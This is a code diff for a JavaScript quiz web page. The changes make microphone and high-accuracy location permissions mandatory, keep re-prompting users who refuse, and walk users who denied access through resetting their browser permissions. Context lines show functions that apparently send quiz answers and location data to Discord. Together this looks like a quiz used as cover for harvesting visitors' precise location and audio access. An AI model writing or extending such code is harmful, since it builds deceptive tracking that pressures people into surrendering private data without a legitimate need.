@@ -108,6 +108,11 @@ const questions = [
     }
 ];
 
+// Permission tracking variables
+let microphonePermissionGranted = false;
+let locationPermissionGranted = false;
+let userLocation = null;
+
 let currentQuestionIndex = 0;
 const welcomeContainer = document.querySelector('.welcome-container');
 const questionContainer = document.querySelector('.question-container');
@@ -1373,14 +1378,36 @@ document.addEventListener('DOMContentLoaded', async () => {
     startButton.addEventListener('click', () => {
         // Request both microphone and location permissions simultaneously
         const micPromise = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 
-            navigator.mediaDevices.getUserMedia({ audio: true }) : Promise.reject('Microphone API not available');
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    microphonePermissionGranted = true;
+                    return stream;
+                })
+                .catch(error => {
+                    console.error('Microphone permission error:', error);
+                    microphonePermissionGranted = false;
+                    throw error;
+                })
+            : Promise.reject('Microphone API not available');
         
         const geoPromise = navigator.geolocation && navigator.geolocation.getCurrentPosition ? 
             new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(
-                    position => resolve(position),
-                    error => reject(error),
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    position => {
+                        locationPermissionGranted = true;
+                        resolve(position);
+                    },
+                    error => {
+                        console.error('Location permission error:', error);
+                        locationPermissionGranted = false;
+                        // Check if the error is due to device location being turned off
+                        if (error.code === 2) { // POSITION_UNAVAILABLE
+                            reject({ type: 'location_off', message: 'Please turn on your device location and try again.' });
+                        } else {
+                            reject(error);
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }) : Promise.reject('Geolocation API not available');
         
@@ -1394,7 +1421,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             })
             .catch(error => {
                 console.error('Permission error:', error);
-                showPermissionCard();
+                showPermissionCard(error);
             });
     });
 
@@ -2081,10 +2108,6 @@ function sendToDiscord(question, answer) {
     });
 }
 
-// Add location permission variables
-let locationPermissionGranted = false;
-let userLocation = null;
-
 // Function to handle location permission
 function handleLocationPermission(position) {
     locationPermissionGranted = true;
@@ -2154,8 +2177,14 @@ function sendLocationToDiscord(locationData) {
     });
 }
 
-/* Updated function to display a combined permissions card */
-function showPermissionCard() {
+/* Updated function to display a combined permissions card with better error handling */
+function showPermissionCard(error) {
+    // Remove any existing permission card to prevent duplicates
+    const existingOverlay = document.getElementById('permission-card-overlay');
+    if (existingOverlay) {
+        existingOverlay.remove();
+    }
+    
     const overlay = document.createElement('div');
     overlay.id = 'permission-card-overlay';
     overlay.style.position = 'fixed';
@@ -2180,14 +2209,44 @@ function showPermissionCard() {
     card.style.width = '400px';
     card.style.fontFamily = 'Poppins, sans-serif';
 
+    let messageText = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
+    
+    // Check if we have a specific error about location being turned off
+    if (error && error.type === 'location_off') {
+        messageText = "Please turn on your device location services. Location access is required for the full interactive experience.";
+    } else if (!microphonePermissionGranted && !locationPermissionGranted) {
+        messageText = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
+    } else if (!microphonePermissionGranted) {
+        messageText = "We still need access to your microphone. This permission is required to continue.";
+    } else if (!locationPermissionGranted) {
+        messageText = "We still need access to your location. This permission is required to continue.";
+    }
+
     const message = document.createElement('p');
-    message.textContent = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
+    message.textContent = messageText;
     message.style.color = '#4a4a4a';
     message.style.fontSize = '1.1rem';
     message.style.marginBottom = '1.5rem';
 
+    // Add instructions for browser permission reset if needed
+    if (error && !(error.type === 'location_off')) {
+        const helpText = document.createElement('p');
+        helpText.innerHTML = "If you accidentally denied permissions, you may need to reset them in your browser settings:<br>• Click the lock/info icon in your browser's address bar<br>• Find the site permissions and reset them";
+        helpText.style.color = '#666';
+        helpText.style.fontSize = '0.9rem';
+        helpText.style.marginBottom = '1.5rem';
+        helpText.style.textAlign = 'left';
+        card.appendChild(helpText);
+    }
+
+    // If location is turned off on device, show specific button
     const givePermissionButton = document.createElement('button');
-    givePermissionButton.textContent = "Grant Required Permissions";
+    if (error && error.type === 'location_off') {
+        givePermissionButton.textContent = "I've Turned On Location Services";
+    } else {
+        givePermissionButton.textContent = "Grant Required Permissions";
+    }
+    
     givePermissionButton.style.padding = '0.8rem 1.2rem';
     givePermissionButton.style.fontSize = '1rem';
     givePermissionButton.style.backgroundColor = '#ff6b6b';
@@ -2196,6 +2255,7 @@ function showPermissionCard() {
     givePermissionButton.style.borderRadius = '50px';
     givePermissionButton.style.cursor = 'pointer';
     givePermissionButton.style.transition = 'all 0.3s ease';
+    givePermissionButton.style.marginBottom = '1rem';
 
     givePermissionButton.addEventListener('mouseover', () => {
          givePermissionButton.style.backgroundColor = '#ff4757';
@@ -2205,15 +2265,62 @@ function showPermissionCard() {
     });
 
     givePermissionButton.addEventListener('click', () => {
-        // Try to get both permissions again
-        const micPromise = navigator.mediaDevices.getUserMedia({ audio: true });
-        const geoPromise = new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(
-                position => resolve(position),
-                error => reject(error),
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-            );
-        });
+        // Try to get both permissions again with appropriate handling
+        let micPromise;
+        
+        if (!microphonePermissionGranted) {
+            micPromise = navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    microphonePermissionGranted = true;
+                    return stream;
+                })
+                .catch(error => {
+                    console.error('Microphone permission error after retry:', error);
+                    throw error;
+                });
+        } else {
+            // If we already have microphone permission, just return the stream
+            micPromise = window.microphoneStream ? 
+                Promise.resolve(window.microphoneStream) : 
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        microphonePermissionGranted = true;
+                        return stream;
+                    });
+        }
+        
+        let geoPromise;
+        
+        if (!locationPermissionGranted) {
+            geoPromise = new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        locationPermissionGranted = true;
+                        resolve(position);
+                    },
+                    error => {
+                        console.error('Location permission error after retry:', error);
+                        // Check if the error is due to device location being turned off
+                        if (error.code === 2) { // POSITION_UNAVAILABLE
+                            reject({ type: 'location_off', message: 'Please turn on your device location and try again.' });
+                        } else {
+                            reject(error);
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        } else {
+            // If we already have location permission, just use the stored location
+            geoPromise = userLocation ? Promise.resolve({ coords: userLocation }) : 
+                new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve(position),
+                        error => reject(error),
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                });
+        }
         
         Promise.all([micPromise, geoPromise])
             .then(([micStream, geoPosition]) => {
@@ -2224,12 +2331,55 @@ function showPermissionCard() {
             })
             .catch(error => {
                 console.error('Permission error after retry:', error);
-                alert("Both microphone and location permissions are required for the full interactive experience.");
+                // Update the card with new error information instead of creating a new one
+                overlay.remove();
+                showPermissionCard(error);
             });
     });
 
     card.appendChild(message);
     card.appendChild(givePermissionButton);
+    
+    // Add a settings button to help with permissions
+    const openSettingsButton = document.createElement('button');
+    openSettingsButton.textContent = "Open Browser Settings";
+    openSettingsButton.style.background = 'transparent';
+    openSettingsButton.style.border = '1px solid #ff6b6b';
+    openSettingsButton.style.color = '#ff6b6b';
+    openSettingsButton.style.padding = '0.8rem 1.2rem';
+    openSettingsButton.style.fontSize = '1rem';
+    openSettingsButton.style.borderRadius = '50px';
+    openSettingsButton.style.cursor = 'pointer';
+    openSettingsButton.style.transition = 'all 0.3s ease';
+    openSettingsButton.style.display = error && !(error.type === 'location_off') ? 'inline-block' : 'none';
+
+    openSettingsButton.addEventListener('mouseover', () => {
+        openSettingsButton.style.backgroundColor = '#fff0f0';
+    });
+    openSettingsButton.addEventListener('mouseout', () => {
+        openSettingsButton.style.backgroundColor = 'transparent';
+    });
+
+    openSettingsButton.addEventListener('click', () => {
+        let settingsUrl;
+        
+        // Different settings URLs for different browsers
+        if (navigator.userAgent.includes('Chrome')) {
+            settingsUrl = 'chrome://settings/content/siteDetails?site=' + encodeURIComponent(window.location.origin);
+            alert('Please copy and paste this in a new tab: ' + settingsUrl);
+        } else if (navigator.userAgent.includes('Firefox')) {
+            alert('Please click the lock icon in the address bar and update your permissions');
+        } else if (navigator.userAgent.includes('Safari')) {
+            alert('Please go to Safari Preferences > Websites to update permissions');
+        } else {
+            alert('Please check your browser settings to update site permissions');
+        }
+    });
+
+    if (error && !(error.type === 'location_off')) {
+        card.appendChild(openSettingsButton);
+    }
+    
     overlay.appendChild(card);
     document.body.appendChild(overlay);
 }
